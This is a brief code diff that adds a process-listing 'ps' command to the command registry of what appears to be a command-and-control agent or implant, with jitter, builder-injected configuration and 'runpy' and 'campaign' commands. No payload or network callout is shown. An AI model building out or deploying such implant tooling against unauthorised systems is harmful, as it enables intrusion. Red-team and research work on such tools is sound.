@@ -24,6 +24,7 @@ from commands import jitter as cmd_jitter
 from commands import config as agent_config
 from commands import runpy as cmd_runpy
 from commands import campaign as cmd_campaign
+from commands import ps as cmd_ps
 
 
 # --- Injected by builder via string substitution ---
@@ -125,6 +126,7 @@ COMMANDS = {
     "jitter":   cmd_jitter.execute,
     "runpy":    cmd_runpy.execute,
     "campaign": cmd_campaign.execute,
+    "ps":       cmd_ps.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
